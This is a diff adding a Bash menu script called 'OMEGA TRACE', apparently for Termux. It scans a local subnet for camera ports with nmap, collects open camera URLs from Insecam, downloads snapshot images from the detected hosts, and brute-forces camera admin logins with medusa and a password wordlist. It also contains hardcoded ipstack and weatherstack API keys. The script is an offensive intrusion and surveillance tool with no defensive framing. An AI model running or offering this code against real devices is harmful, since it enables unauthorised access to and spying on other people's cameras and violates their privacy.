@@ -1,0 +1,145 @@
+#!/bin/bash
+
+# === Colors ===
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+CYAN='\033[0;36m'
+YELLOW='\033[1;33m'
+NC='\033[0m'
+
+# === Anonymous Mask ===
+anonymous_mask() {
+cat << "ASCII" | lolcat
+      ▄▄▄▄▄▄▄
+    ▄▀░░░░░░░▀▄
+   █░░█░░░░░█░░█
+  █░░░▀▀▀▀▀▀░░░█
+  █░░░░░░░░░░░░█
+  █░░░▀▄░░░▄▀░░░█
+   █░░░░▀▀▀░░░░█
+    ▀▄░░░░░░░▄▀
+      ▀▀▄▄▄▄▀▀
+ASCII
+}
+
+# === Matrix Rain ===
+matrix_rain() {
+    for i in {1..25}; do
+        echo $RANDOM | md5sum | cut -c 1-32 | tr '0-9a-f' '01'
+        sleep 0.02
+    done | lolcat
+}
+
+# === Hacker Animation ===
+hacker_animation() {
+    clear
+    figlet "OMEGA TRACE" | lolcat
+    echo -e "${CYAN}Welcome Omega, Ready To Trace Bitched!${NC}" | lolcat
+    anonymous_mask
+    echo
+}
+
+# === Dependencies ===
+check_install() {
+    pkg list-installed "$1" &>/dev/null || {
+        echo -e "${YELLOW}Installing $1...${NC}" | lolcat
+        pkg install -y "$1" || { echo -e "${RED}Failed to install $1. Exiting.${NC}"; exit 1; }
+    }
+}
+
+# === Camera Detection on LAN ===
+detect_cameras() {
+    echo -e "${CYAN}Scanning LAN for possible camera devices...${NC}"
+    nmap -p 80,554,8080 --open 192.168.1.0/24 | grep "Nmap scan report for" | tee /tmp/camera_ips.txt | lolcat
+    echo -e "${YELLOW}Camera IP list saved to /tmp/camera_ips.txt${NC}"
+}
+
+# === Fetch Open Internet Cameras (Insecam) ===
+fetch_insecam() {
+    echo -e "${CYAN}Fetching open cameras from Insecam.org...${NC}"
+    curl -s "http://www.insecam.org/en/json/" | jq '.data[] | .url' | tee /tmp/insecam_ips.txt | lolcat
+}
+
+# === Camera Snapshot Grabber ===
+grab_snapshots() {
+    if [ ! -f /tmp/camera_ips.txt ]; then
+        echo -e "${RED}No camera IP list found. Run 'LAN Camera Detection' first.${NC}" | lolcat
+        return
+    fi
+    echo -e "${YELLOW}Attempting snapshot grab from detected cameras...${NC}"
+    while read -r ip; do
+        echo -e "[*] Trying $ip ..." | lolcat
+        curl -s "http://$ip/snapshot.jpg" -o "/sdcard/${ip}_snapshot.jpg" && echo -e "[+] Snapshot saved for $ip" | lolcat
+    done < /tmp/camera_ips.txt
+}
+
+# === Camera Brute Force Login ===
+brute_force_camera() {
+    read -rp "Enter target IP for camera brute-force: " target
+    echo -e "[*] Starting brute-force on $target ..." | lolcat
+    medusa -h $target -u admin -P /usr/share/wordlists/passwords.txt -M http | tee /tmp/cam_brute.log | lolcat
+    echo -e "${YELLOW}Results saved in /tmp/cam_brute.log${NC}"
+}
+
+# === Public IP Lookup ===
+lookup_ip() {
+    read -rp "Enter IP to lookup: " ip
+    curl -s "http://api.ipstack.com/$ip?access_key=983c2dc84cb3e24c36e55dd8e9c04691" | jq | lolcat
+}
+
+# === Weather Forecast ===
+get_weather() {
+    read -rp "Enter city name (e.g. London): " city
+    echo -e "${CYAN}Fetching weather for $city...${NC}"
+    curl -s "http://api.weatherstack.com/current?access_key=7dcfb50597605fa14c5d70ae52b292cc&query=$city" | jq | lolcat
+    echo -e "${YELLOW}--- 3-Day Forecast ---${NC}" | lolcat
+    curl -s "http://api.weatherstack.com/forecast?access_key=7dcfb50597605fa14c5d70ae52b292cc&query=$city&forecast_days=3" | jq | lolcat
+}
+
+# === System Info ===
+system_info() {
+    echo "Hostname: $(hostname)" | lolcat
+    echo "User: $USER" | lolcat
+    echo "OS: $(uname -a)" | lolcat
+    echo "Uptime: $(uptime -p)" | lolcat
+    df -h | lolcat
+}
+
+# === Menu ===
+main_menu() {
+    echo -e "${YELLOW}1) Show My Public IP & Location${NC}"
+    echo -e "${YELLOW}2) Scan LAN for Devices${NC}"
+    echo -e "${YELLOW}3) LAN Camera Detection${NC}"
+    echo -e "${YELLOW}4) Fetch Open Cameras (Insecam)${NC}"
+    echo -e "${YELLOW}5) Grab Live Screenshots (LAN Cameras)${NC}"
+    echo -e "${YELLOW}6) Brute-force Camera Login${NC}"
+    echo -e "${YELLOW}7) Weather Forecast (3 Days)${NC}"
+    echo -e "${YELLOW}8) System Info${NC}"
+    echo -e "${YELLOW}9) Exit${NC}"
+    echo
+    read -rp "Choose (1-9): " choice
+    case $choice in
+        1) ip=$(curl -s ifconfig.me); curl -s "http://api.ipstack.com/$ip?access_key=983c2dc84cb3e24c36e55dd8e9c04691" | jq | lolcat ;;
+        2) nmap -sn 192.168.1.0/24 | grep "Nmap scan report for" | lolcat ;;
+        3) detect_cameras ;;
+        4) fetch_insecam ;;
+        5) grab_snapshots ;;
+        6) brute_force_camera ;;
+        7) get_weather ;;
+        8) system_info ;;
+        9) echo -e "${RED}Exiting...${NC}" | lolcat; exit 0 ;;
+        *) echo -e "${RED}Invalid choice!${NC}" ;;
+    esac
+}
+
+# === Run ===
+matrix_rain
+hacker_animation
+while true; do
+    main_menu
+    echo
+    read -rp "Press Enter to continue..." _
+    clear
+    matrix_rain
+    hacker_animation
+done
